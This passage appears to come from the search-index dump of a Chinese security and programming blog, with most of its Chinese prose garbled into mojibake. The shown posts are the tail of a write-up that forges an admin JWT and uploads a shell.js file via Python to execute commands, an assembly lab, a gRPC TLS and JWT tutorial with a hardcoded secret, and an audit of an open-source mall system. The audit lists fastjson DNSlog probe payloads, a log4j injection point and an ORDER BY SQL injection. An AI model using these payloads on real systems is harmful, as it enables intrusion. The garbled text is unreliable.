eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaG9tZSI6eyJocmVmIjoiYyIsIm9yaWdpbiI6ImMiLCJwcm90b2NvbCI6ImZpbGU6IiwiaG9zdG5hbWUiOiIiLCJwYXRobmFtZSI6Ii9hcHAvJTcyJTZmJTc1JTc0JTY1JTczL2luZGV4LiU2YSU3MyJ9LCJpYXQiOjE2NjkzMDYzNDZ9.RdEQN3Kt0c_Fz_n9uJP3dTYZHWqdp6GoJ3Yd5YpZjl4&quot;}file = {&quot;file&quot;:(&quot;./shell.js&quot;,open(&quot;./shell.js&quot;,&quot;rb&quot;).read())}res = sess.post(url=url+&quot;/api/upload&quot;,files=file,headers=hearder)print(res.text) ç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤","link":"/2022/11/24/yjs/"},{"title":"ç‹çˆ½æ±‡ç¼–LAB-7","text":"æ±‡ç¼–å®éªŒä¸ƒ assume cs:codesg data segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995' ;ä»¥ä¸Šæ˜¯è¡¨ç¤º21å¹´çš„21ä¸ªå­—ç¬¦ä¸² dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000 ;ä»¥ä¸Šæ˜¯è¡¨ç¤º21å¹´å…¬å¸æ€»æ”¶å…¥çš„21ä¸ªdwordå‹æ•°æ® dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800 ;ä»¥ä¸Šæ˜¯è¡¨ç¤º21Ianå…¬å¸é›‡å‘˜äººæ•°çš„21ä¸ªwordå‹æ•°æ® data ends table segment db 21 dup ('year summ ne ?? ')table endscodesg segmentstart: mov ax,data mov ds,ax mov ax,table mov es,ax xor bx,bx xor si,si xor di,di mov cx,21s: ;year mov ax,[bx] mov es:[di],ax mov ax,[bx+2] mov es:[di+2],ax ;space mov byte ptr es:[di+4],20h ;income mov ax,[bx+84] mov es:[di+5],ax mov ax,[bx+86] mov es:[di+7],ax mov byte ptr es:[di+9],20h ;people mov ax,[bx+168] mov es:[di+10],ax mov byte ptr es:[di+12],20h ;salary mov ax,[bx+84] mov dx,[bx+86] div word ptr ds:[si+168] mov es:[di+13],ax mov byte ptr es:[di+0fh],20h add di,16 add si,2 add bx,4loop s mov ax,4c00h int 21hcodesg endsend start æ•ˆæœå¦‚å›¾","link":"/2021/11/27/test/"},{"title":"GRPCå­¦ä¹ ","text":"ä»‹ç» å¾®æœåŠ¡å’Œå•ä½“æ¶æ„å•ä½“æ¶æ„å¼Šç«¯ ç´§è€¦åˆ å•ä½“åº”ç”¨ç¨‹åºä¸­çš„æœåŠ¡æ¨¡å—æ˜¯ç´§è€¦åˆçš„ã€‚ä¸šåŠ¡é€»è¾‘çº ç¼ ä¸æ¸…ï¼Œå¾ˆéš¾éš”ç¦»åº”ç”¨ç¨‹åºï¼Œå› æ­¤å¯æ‰©å±•æ€§æˆä¸ºä¸€ä¸ªæŒ‘æˆ˜ã€‚ ç¼“æ…¢çš„æ„å»ºå’Œå‘å¸ƒå‘¨æœŸ ç”±äºä»£ç åº“éå¸¸åºå¤§ï¼Œè¿™ä¼šå»¶ç¼“åº”ç”¨ç¨‹åºçš„å¼€å‘å’Œæµ‹è¯•å‘¨æœŸçš„é€Ÿåº¦ã€‚ å¾®æœåŠ¡è§£å†³äº†å•ä½“æ¶æ„çš„å¼Šç«¯ ä½†ä¹Ÿæœ‰æ–°çš„ç¼ºç‚¹ ä»£ç å†—ä½™ æœåŠ¡å’ŒæœåŠ¡ä¹‹é—´è°ƒç”¨ï¼Œè¿›ç¨‹å’Œè¿›ç¨‹ä¹‹é—´è°ƒç”¨ ä¸ºäº†åŠ å¿«ç½‘ç»œä¼ è¾“ï¼Œåœ¨å¾®æœåŠ¡ä¸­å¼•å…¥RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ï¼Œé€šè¿‡è‡ªå®šä¹‰åè®®å‘èµ·TCPè°ƒç”¨ RPCæ¡†æ¶æ˜¯ä»€ä¹ˆhttps://zhuanlan.zhihu.com/p/411315625 RPC æ¡†æ¶è¯´ç™½äº†å°±æ˜¯è®©ä½ å¯ä»¥åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·è°ƒç”¨è¿œç¨‹æœåŠ¡æä¾›çš„æ–¹æ³•ï¼Œè€Œä¸éœ€è¦å…³å¿ƒåº•å±‚çš„é€šä¿¡ç»†èŠ‚ã€‚ç®€å•åœ°è¯´å°±è®©è¿œç¨‹æœåŠ¡è°ƒç”¨æ›´åŠ ç®€å•ã€é€æ˜ã€‚ RPCåŒ…å«äº†å®¢æˆ·ç«¯ï¼ˆClientï¼‰å’ŒæœåŠ¡ç«¯ï¼ˆServerï¼‰ GRPChttps://grpc.io/docs/what-is-grpc/introduction/ grpcé»˜è®¤ä½¿ç”¨proto buffersï¼Œæ˜¯è°·æ­Œä¸€å¥—æˆç†Ÿçš„å¼€æºçš„ç»“æ„æ•°æ®åºåˆ—åŒ–æœºåˆ¶ Protobufå®‰è£…å®‰è£…protobuf brew install protobufprotoc --version //éªŒè¯ å®‰è£…goè¯­è¨€çš„protocç”Ÿæˆå™¨ go install google.golang.org/protobuf/cmd/protoc-gen-go@latest Protoæ–‡ä»¶// å£°æ˜ç‰ˆæœ¬syntax = &quot;proto3&quot;;//option go_package = &quot;path;name&quot; pathè¡¨ç¤ºç”Ÿæˆgoçš„å­˜æ”¾åœ°å€,è‡ªåŠ¨ç”Ÿæˆç›®å½•,nameè¡¨ç¤ºgoæ–‡ä»¶æ‰€å±åŒ…åoption go_package = &quot;.;service&quot;;//æœåŠ¡æ–¹æ³•,æ¥å—å®¢æˆ·ç«¯å‚æ•°,è¿”å›æœåŠ¡ç«¯å“åº”service SayHello { rpc SayHello(HelloRequest) returns (HelloResponse) {}}//ç±»ä¼¼ç»“æ„ä½“message HelloRequest { string username = 1; int64 code = 2;}message HelloResponse { string responseMsg = 1;} åˆ©ç”¨å‘½ä»¤ç”Ÿæˆ protoc --go_out=../rpc hello.protoprotoc --go-grpc_out=../rpc hello.proto æœåŠ¡ç«¯ä»£ç å®ç°package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;log&quot; &quot;net&quot; &quot;strconv&quot;)type server struct { service.UnimplementedSayHelloServer}func (s *server) SayHello(ctx context.Context, req *service.HelloRequest) (*service.HelloResponse, error) { fmt.Println(&quot;recv from &quot; + req.Username) return &amp;service.HelloResponse{ResponseMsg: &quot;hello &quot; + req.Username + &quot;\\nyour code is: &quot; + strconv.Itoa(int(req.Code))}, nil}func main() { lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { log.Fatalf(&quot;failed to listen: %v&quot;, err) } grpcServer := grpc.NewServer() service.RegisterSayHelloServer(grpcServer, &amp;server{}) reflection.Register(grpcServer) fmt.Println(&quot;Listening on port 2333...&quot;) grpcServer.Serve(lis)} å®¢æˆ·ç«¯ä»£ç å®ç°package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials/insecure&quot;)func main() { conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(insecure.NewCredentials())) if err != nil { return } defer conn.Close() client := service.NewSayHelloClient(conn) resp, _ := client.SayHello(context.Background(), &amp;service.HelloRequest{ Username: &quot;qqw&quot;, Code: 3377, }) fmt.Println(resp.GetResponseMsg())} è®¤è¯ä»¥åŠå®‰å…¨ä¼ è¾“åˆšæ‰å†™çš„ä»£ç æ˜¯ä¸å®‰å…¨çš„ï¼Œåœ¨å®¢æˆ·ç«¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåªè¦æˆ‘ä»¬çŸ¥é“ç›®æ ‡æœåŠ¡å™¨çš„ipå’Œç«¯å£å°±èƒ½å¤Ÿå¯¹å®ƒè¿›è¡Œè¿æ¥ä¼ è¾“ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é‡‡å–ç›¸å…³è®¤è¯å’Œå®‰å…¨çš„ä¼ è¾“æ–¹å¼ gRPC å†…é»˜è®¤æä¾›äº†ä¸¤ç§ å†…ç½®çš„è®¤è¯æ–¹å¼ï¼š åŸºäº CA è¯ä¹¦çš„ SSL/TLS è®¤è¯æ–¹å¼ï¼› åŸºäº Token çš„è®¤è¯æ–¹å¼ã€‚ gRPC ä¸­çš„è¿æ¥ç±»å‹ä¸€å…±æœ‰ä»¥ä¸‹ 3 ç§ï¼š insecure connectionï¼šä¸ä½¿ç”¨ TLS åŠ å¯†ï¼› server-side TLSï¼šä»…æœåŠ¡ç«¯ TLS åŠ å¯†ï¼› mutual TLSï¼šå®¢æˆ·ç«¯ã€æœåŠ¡ç«¯éƒ½ä½¿ç”¨ TLS åŠ å¯†ã€‚ å¦‚ä¹‹å‰çš„è¿æ¥å°±æ˜¯ä¸å®‰å…¨çš„ conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(insecure.NewCredentials())) TLSè®¤è¯å®ç°å‚è€ƒ https://www.cnblogs.com/rickiyang/p/14981374.html å®¢æˆ·ç«¯CAè¯ä¹¦ # ç”Ÿæˆ.key ç§é’¥æ–‡ä»¶openssl genrsa -out ca.key 2048# ç”Ÿæˆ.csr è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶openssl req -new -key ca.key -out ca.csr# è‡ªç­¾åç”Ÿæˆ.crt è¯ä¹¦æ–‡ä»¶openssl req -new -x509 -days 3650 -key ca.key -out ca.crt æœåŠ¡ç«¯è¯ä¹¦ å…¶ä¸­éœ€è¦å…ˆå¤åˆ¶æœ¬æœºçš„openssl.cnfæ–‡ä»¶åˆ°è¯¥ç›®å½•ï¼Œç„¶åè¿›è¡Œç›¸å…³ä¿®æ”¹ # ç”Ÿæˆ.key ç§é’¥æ–‡ä»¶openssl genrsa -out server.key 2048# ç”Ÿæˆ.csr è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶openssl req -new -subj &quot;/C=GB/L=Beijing/O=github/CN=qqw.com&quot; \\-key server.key -out server.csr -config openssl.cnf# ç­¾åç”Ÿæˆ.crt è¯ä¹¦æ–‡ä»¶openssl x509 -req -sha256 -CA ca.crt -CAkey ca.key -CAcreateserial -days 365 \\-in server.csr -out server.crt -extensions v3_req -extfile openssl.cnf ä¿®æ”¹ç›¸å…³ä»£ç  package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;log&quot; &quot;net&quot; &quot;strconv&quot;)type server struct { service.UnimplementedSayHelloServer}func (s *server) SayHello(ctx context.Context, req *service.HelloRequest) (*service.HelloResponse, error) { fmt.Println(&quot;recv from &quot; + req.Username) return &amp;service.HelloResponse{ResponseMsg: &quot;hello &quot; + req.Username + &quot;\\nyour code is: &quot; + strconv.Itoa(int(req.Code))}, nil}func main() { //æœåŠ¡ç«¯è¿™é‡Œæ·»åŠ ä¸Šè¯ä¹¦å’Œå¯†é’¥ cert, _ := credentials.NewServerTLSFromFile(&quot;ç»å¯¹è·¯å¾„/server.crt&quot;, &quot;ç»å¯¹è·¯å¾„/server.key&quot;) lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { log.Fatalf(&quot;failed to listen: %v&quot;, err) } //æœåŠ¡ç«¯è¿™é‡Œæ·»åŠ ä¸Šè¯ä¹¦å’Œå¯†é’¥ grpcServer := grpc.NewServer(grpc.Creds(cert)) service.RegisterSayHelloServer(grpcServer, &amp;server{}) reflection.Register(grpcServer) fmt.Println(&quot;Listening on port 2333...&quot;) grpcServer.Serve(lis)} package mainimport ( service &quot;LearnTest/rpc&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot;)func main() { //å®¢æˆ·ç«¯è¿™é‡Œæ·»åŠ è¯ä¹¦ï¼Œä»¥åŠé…ç½®ç›¸å…³åŸŸåï¼Œè‹¥ä¸æ˜¯æœåŠ¡ç«¯è§„å®šçš„åˆ™ä¸èƒ½é€šè¿‡è®¤è¯ cert, _ := credentials.NewClientTLSFromFile(&quot;ç»å¯¹è·¯å¾„/ca.crt&quot;, &quot;kk.qqw.com&quot;) conn, err := grpc.Dial(&quot;127.0.0.1:2333&quot;, grpc.WithTransportCredentials(cert)) if err != nil { return } defer conn.Close() client := service.NewSayHelloClient(conn) resp, _ := client.SayHello(context.Background(), &amp;service.HelloRequest{ Username: &quot;qqw&quot;, Code: 3377, }) fmt.Println(resp.GetResponseMsg())} Tokenè®¤è¯å®ç°è¿™é‡Œå†å†™ä¸€ä¸ªtoken.protoæ–‡ä»¶ // å£°æ˜ç‰ˆæœ¬syntax = &quot;proto3&quot;;//option go_package = &quot;path;name&quot; pathè¡¨ç¤ºç”Ÿæˆgoçš„å­˜æ”¾åœ°å€,nameè¡¨ç¤ºgoæ–‡ä»¶æ‰€å±åŒ…åoption go_package = &quot;.;service&quot;;message LoginRequest { string username = 1; string password = 2;}message LoginResp { string status = 1; string token = 2;}message PingMessage { string greet = 1;}service TokenService { rpc Login(LoginRequest) returns (LoginResp) {} rpc Greet(PingMessage) returns (PingMessage) {}} protoc --go_out=../rpc token.protoprotoc --go-grpc_out=../rpc token.proto é‡‡ç”¨jwt-goåštokençš„éªŒè¯ package tokenimport ( &quot;context&quot; &quot;fmt&quot; &quot;time&quot; &quot;github.com/dgrijalva/jwt-go&quot; &quot;google.golang.org/grpc/metadata&quot;)func CreateToken(userName string) (tokenString string) { token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ &quot;iss&quot;: &quot;lora-app-server&quot;, &quot;aud&quot;: &quot;lora-app-server&quot;, &quot;nbf&quot;: time.Now().Unix(), &quot;exp&quot;: time.Now().Add(time.Hour).Unix(), &quot;sub&quot;: &quot;user&quot;, &quot;username&quot;: userName, }) tokenString, err := token.SignedString([]byte(&quot;qqw-1-sec-37&quot;)) if err != nil { panic(err) } return tokenString}// AuthToken è‡ªå®šä¹‰è®¤è¯type AuthToken struct { Token string}func (c AuthToken) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) { return map[string]string{ &quot;authorization&quot;: c.Token, }, nil}func (c AuthToken) RequireTransportSecurity() bool { return false}// Claims defines the struct containing the token claims.type Claims struct { jwt.StandardClaims // Username defines the identity of the user. Username string `json:&quot;username&quot;`}// Step1. ä» context çš„ metadata ä¸­ï¼Œå–å‡º tokenfunc getTokenFromContext(ctx context.Context) (string, error) { md, ok := metadata.FromIncomingContext(ctx) if !ok { return &quot;&quot;, fmt.Errorf(&quot;ErrNoMetadataInContext&quot;) } // md çš„ç±»å‹æ˜¯ type MD map[string][]string token, ok := md[&quot;authorization&quot;] if !ok || len(token) == 0 { return &quot;&quot;, fmt.Errorf(&quot;ErrNoAuthorizationInMetadata&quot;) } // å› æ­¤ï¼Œtoken æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œæˆ‘ä»¬åªç”¨äº† token[0] return token[0], nil}func CheckAuth(ctx context.Context) (username string) { tokenStr, err := getTokenFromContext(ctx) if err != nil { panic(&quot;get token from context error&quot;) } var clientClaims Claims token, err := jwt.ParseWithClaims(tokenStr, &amp;clientClaims, func(token *jwt.Token) (interface{}, error) { if token.Header[&quot;alg&quot;] != &quot;HS256&quot; { panic(&quot;ErrInvalidAlgorithm&quot;) } return []byte(&quot;qqw-1-sec-37&quot;), nil }) if err != nil { panic(&quot;jwt parse error&quot;) } if !token.Valid { panic(&quot;ErrInvalidToken&quot;) } return clientClaims.Username} ç„¶åç¼–å†™æœåŠ¡ç«¯ä»£ç  æ³¨æ„è¿™ä¸ªåœ°æ–¹token_grpc.pb.goä¼šè‡ªè¡Œç¼–è¯‘å‡ºä¸€ä¸ªmustEmbedUnimplementedTokenServiceServer()æ–¹æ³• å‚è€ƒ type TokenServiceServer interface { Login(context.Context, *LoginRequest) (*LoginResp, error) Greet(context.Context, *PingMessage) (*PingMessage, error) mustEmbedUnimplementedTokenServiceServer()} å¯ä»¥åœ¨ç¼–è¯‘æ—¶åŠ å‚æ•°å–æ¶ˆè¿™ä¸ªæ–¹æ³• protoc --go_out=../rpc --go-grpc_out=require_unimplemented_servers=false:../rpc token.proto æˆ–è€…é€šè¿‡ç»“æ„ä½“åµŒå¥—æ–¹å¼é»˜è®¤å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå¦åˆ™åœ¨gprcæœåŠ¡ç«¯æ³¨å†ŒæœåŠ¡çš„æ—¶å€™ä¼šæŠ¥é”™ package mainimport ( service &quot;LearnTest/rpc&quot; &quot;LearnTest/token&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/grpclog&quot; &quot;google.golang.org/grpc/reflection&quot; &quot;net&quot;)// LoggingInterceptor æ—¥å¿—æ‹¦æˆªå™¨func LoggingInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) { fmt.Printf(&quot;request gRPC method: %s, %v\\n&quot;, info.FullMethod, req) resp, err := handler(ctx, req) fmt.Printf(&quot;response gRPC method: %s, %v\\n&quot;, info.FullMethod, resp) return resp, err}type login struct { //é€šè¿‡ç»“æ„ä½“åµŒå¥—æ–¹å¼é»˜è®¤å®ç°è¿™ä¸ªæ–¹æ³• service.UnimplementedTokenServiceServer}func (login *login) Login(ctx context.Context, request *service.LoginRequest) (resp *service.LoginResp, err error) { if request.Username == &quot;qqw&quot; &amp;&amp; request.Password == &quot;qqw&quot; { token := token.CreateToken(request.Username) return &amp;service.LoginResp{Status: &quot;200&quot;, Token: token}, nil } return &amp;service.LoginResp{Status: &quot;401&quot;, Token: &quot;&quot;}, nil}func (login *login) Greet(ctx context.Context, request *service.PingMessage) (resp *service.PingMessage, err error) { auth := token.CheckAuth(ctx) return &amp;service.PingMessage{Greet: auth}, nil}func main() { lis, err := net.Listen(&quot;tcp&quot;, &quot;:2333&quot;) if err != nil { fmt.Printf(&quot;failed to listen: %v\\n&quot;, err) return } // TLSè®¤è¯ creds, err := credentials.NewServerTLSFromFile(&quot;/Users/liuke/GolandProjects/LearnTest/ssl/server.crt&quot;, &quot;/Users/liuke/GolandProjects/LearnTest/ssl/server.key&quot;) if err != nil { grpclog.Fatalf(&quot;Failed to generate credentials %v&quot;, err) } //å¼€å¯TLSè®¤è¯ æ³¨å†Œæ‹¦æˆªå™¨ s := grpc.NewServer(grpc.Creds(creds), grpc.UnaryInterceptor(LoggingInterceptor)) // åˆ›å»ºgRPCæœåŠ¡å™¨ service.RegisterTokenServiceServer(s, &amp;login{}) // åœ¨gRPCæœåŠ¡ç«¯æ³¨å†ŒæœåŠ¡ reflection.Register(s) //åœ¨ç»™å®šçš„gRPCæœåŠ¡å™¨ä¸Šæ³¨å†ŒæœåŠ¡å™¨åå°„æœåŠ¡ // Serveæ–¹æ³•åœ¨listä¸Šæ¥å—ä¼ å…¥è¿æ¥ï¼Œä¸ºæ¯ä¸ªè¿æ¥åˆ›å»ºä¸€ä¸ªServerTransportå’Œserverçš„goroutineã€‚ // è¯¥goroutineè¯»å–gRPCè¯·æ±‚ï¼Œç„¶åè°ƒç”¨å·²æ³¨å†Œçš„å¤„ç†ç¨‹åºæ¥å“åº”å®ƒä»¬ã€‚ fmt.Println(&quot;Listening on port 2333...&quot;) err = s.Serve(lis)} æ¥ç€ç¼–å†™å®¢æˆ·ç«¯ä»£ç  package mainimport ( service &quot;LearnTest/rpc&quot; Token &quot;LearnTest/token&quot; &quot;context&quot; &quot;fmt&quot; &quot;google.golang.org/grpc&quot; &quot;google.golang.org/grpc/credentials&quot; &quot;google.golang.org/grpc/grpclog&quot;)func main() { var err error var opts []grpc.DialOption // TLSè¿æ¥ creds, err := credentials.NewClientTLSFromFile(&quot;/Users/liuke/GolandProjects/LearnTest/ssl/ca.crt&quot;, &quot;www.qqw.com&quot;) if err != nil { grpclog.Fatalf(&quot;Failed to create TLS credentials %v&quot;, err) return } opts = append(opts, grpc.WithTransportCredentials(creds)) //è¿æ¥æœåŠ¡ç«¯ conn, err := grpc.Dial(&quot;:2333&quot;, opts...) if err != nil { fmt.Printf(&quot;failed to connect: %v\\n&quot;, err) return } defer conn.Close() c := service.NewTokenServiceClient(conn) // è°ƒç”¨ç™»å½•æ–¹æ³•,è·å¾—token r, err := c.Login(context.Background(), &amp;service.LoginRequest{Username: &quot;qqw1&quot;, Password: &quot;qqw&quot;}) if err != nil { fmt.Printf(&quot;could not login: %v\\n&quot;, err) return } requestToken := new(Token.AuthToken) requestToken.Token = r.Token //è¿æ¥æœåŠ¡ç«¯ conn, err = grpc.Dial(&quot;:2333&quot;, grpc.WithTransportCredentials(creds), grpc.WithPerRPCCredentials(requestToken)) if err != nil { fmt.Printf(&quot;failed to connect: %v\\n&quot;, err) return } defer conn.Close() c = service.NewTokenServiceClient(conn) greet, err := c.Greet(context.Background(), &amp;service.PingMessage{Greet: &quot;è°ƒç”¨greet&quot;}) if err != nil { fmt.Printf(&quot;could not greet: %v\\n&quot;, err) return } fmt.Printf(&quot;Greeting: %s, %s\\n&quot;, r.Token, greet)} æ­£å¸¸ç™»å½•è¯·æ±‚è¿”å›200ï¼Œç™»å½•è®¤è¯ä¸é€šè¿‡è¿”å›401 å‚è€ƒhttps://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzIzNDcwNjQxMg==&amp;action=getalbum&amp;album_id=1705166100159594498&amp;scene=173&amp;from_msgid=2247484803&amp;from_itemidx=1&amp;count=3&amp;nolastread=1#wechat_redirect https://www.bilibili.com/video/BV1S24y1U7Xp?vd_source=81993e830ebcf48a17d58eb0b7f3a7c2","link":"/2023/03/23/sturpc/"},{"title":"è¿·ä½ å¤©çŒ«å•†åŸç³»ç»Ÿå®¡è®¡","text":"å‰è¨€å¼€å§‹å­¦ä¹ å®¡è®¡ä¸€äº›å¼€æºç³»ç»Ÿ åˆ†æé¦–å…ˆä»ä¸€äº›ä¾èµ–å…¥æ‰‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ndayå¯ä»¥æ‰“ &lt;!-- log4j2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt;&lt;!-- Json --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.58&lt;/version&gt; &lt;/dependency&gt; æœ‰log4j2å’Œfastjsonï¼Œè€Œä¸”éƒ½æ˜¯æ»¡è¶³æ¼æ´åˆ©ç”¨çš„ç‰ˆæœ¬æ¡ä»¶ log4jå…¨å±€æœç´¢logger.info å¯ä»¥åˆ©ç”¨çš„åœ¨æ™®é€šç”¨æˆ·ä¸Šä¼ å¤´åƒå¤„ä»¥åŠç®¡ç†å‘˜ä¸Šä¼ å¤´åƒå¤„ï¼Œè¿˜æœ‰æ–°å¢åˆ†ç±»ä¸Šä¼ å›¾ç‰‡å¤„éƒ½æœ‰ // ä¸Šä¼ äº§å“ç±»å‹å›¾ç‰‡-ajax @ResponseBody @RequestMapping(value = &quot;admin/uploadCategoryImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=utf-8&quot;) public String uploadCategoryImage(@RequestParam MultipartFile file, HttpSession session) { String originalFileName = file.getOriginalFilename(); //æ¼æ´ç‚¹ logger.info(&quot;è·å–å›¾ç‰‡åŸå§‹æ–‡ä»¶å: {}&quot;, originalFileName); String extension = originalFileName.substring(originalFileName.lastIndexOf('.')); String fileName = UUID.randomUUID() + extension; String filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/categoryPicture/&quot; + fileName; logger.info(&quot;æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼š{}&quot;, filePath); JSONObject object = new JSONObject(); try { logger.info(&quot;æ–‡ä»¶ä¸Šä¼ ä¸­...&quot;); file.transferTo(new File(filePath)); logger.info(&quot;æ–‡ä»¶ä¸Šä¼ å®Œæˆ&quot;); object.put(&quot;success&quot;, true); object.put(&quot;fileName&quot;, fileName); } catch (IOException e) { logger.warn(&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥!&quot;); e.printStackTrace(); object.put(&quot;success&quot;, false); } return object.toJSONString();} fastjsonfastjsonå…·ä½“æˆ‘è¿˜æ²¡å»è·Ÿè¿‡é“¾å­ï¼Œä½†æ˜¯ä¹‹å‰ç²—ç•¥çš„çœ‹äº†ä¸‹æ–‡ç« ï¼Œå®ƒæ˜¯é€šè¿‡jndiæ³¨å…¥å¯¼è‡´çš„RCEï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šä½¿ç”¨JSON.parse() å’ŒJSON.parseObject() è¿™ä¸¤ä¸ªæ–¹æ³•. parseObject() ç›¸æ¯”parse()å¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ setter å’Œ getter æ–¹æ³•ã€‚ äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥å…¨å±€æœç´¢è¿™ä¸¤ä¸ªæ–¹æ³• å¯ä»¥å®šä½åˆ°ProductControllerï¼Œåœ¨æ·»åŠ äº§å“ä¿¡æ¯å’Œæ›´æ–°äº§å“ä¿¡æ¯å¤„éƒ½æœ‰ @RequestParam String propertyJson/* äº§å“å±æ€§JSON */,@RequestParam String propertyAddJson/* äº§å“æ·»åŠ å±æ€§JSON */,@RequestParam String propertyUpdateJson/* äº§å“æ›´æ–°å±æ€§JSON */,JSONObject object = JSON.parseObject(propertyJson);JSONObject object = JSON.parseObject(propertyAddJson);object = JSON.parseObject(propertyUpdateJson); åˆ©ç”¨pocéªŒè¯{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;} å…¶ä»–å¯åˆ©ç”¨çš„poc {&quot;zeo&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}]Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:0 å¸¸è§„æ¼æ´å®¡è®¡sqlæ³¨å…¥æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯ç”¨mybatisæ“ä½œæ•°æ®åº“çš„ï¼Œä»¥ä¹‹å‰å®¡è®¡sqlæ³¨å…¥çš„ç»éªŒï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°æœç´¢${è¿™ç§å…³é”®å­—ï¼Œçœ‹æ˜¯å¦æœ‰æ²¡æœ‰åšè¿‡æ»¤çš„ï¼Œè¿˜æœ‰å°±æ˜¯æ³¨æ„order by, likeç­‰å…³é”®å­—ï¼Œä»–ä»¬é‡‡ç”¨#{}ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥å¦‚æœæ²¡åšå¥½è¿‡æ»¤å°±ä¼šé€ æˆsqlæ³¨å…¥ é¦–å…ˆæˆ‘ä»¬åœ¨UserMapper.xmlä¸­æ‰¾åˆ° &lt;select id=&quot;select&quot; resultMap=&quot;userMap&quot;&gt; ...&lt;if test=&quot;orderUtil != null&quot;&gt; ORDER BY ${orderUtil.orderBy}&lt;if test=&quot;orderUtil.isDesc&quot;&gt;desc &lt;/if&gt; &lt;/if&gt; ... æˆ‘ä»¬å®šä½åˆ°daoå±‚çš„userMapçš„select @Mapperpublic interface UserMapper { Integer insertOne(@Param(&quot;user&quot;) User user); Integer updateOne(@Param(&quot;user&quot;) User user); List&lt;User&gt; select(@Param(&quot;user&quot;) User user, @Param(&quot;orderUtil&quot;) OrderUtil orderUtil, @Param(&quot;pageUtil&quot;) PageUtil pageUtil); User 